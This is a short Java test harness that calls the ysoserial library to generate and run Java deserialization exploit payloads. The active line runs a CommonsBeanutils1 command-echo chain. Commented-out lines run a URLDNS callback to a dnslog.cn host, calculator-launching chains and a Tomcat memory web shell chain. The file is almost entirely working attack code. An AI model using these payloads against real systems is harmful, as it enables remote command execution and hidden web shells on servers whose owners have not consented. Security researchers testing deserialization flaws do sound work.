import ysoserial.payloads.*;
import ysoserial.payloads.util.PayloadRunner;

public class TEST {
    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(URLDNS.class, new String[]{"http://102.6r8sbr.dnslog.cn"});
        PayloadRunner.run(CommonsBeanutils1Echo.class, new String[]{"cmd"});
//        PayloadRunner.run(CommonsBeanutils1.class, new String[]{"open -na Calculator"});
//        PayloadRunner.run(CommonsBeanutils1TomcatMemshell.class, new String[]{"cmd"});
//        PayloadRunner.run(CommonsCollections3.class, new String[]{"open -na Calculator"});
    }
}
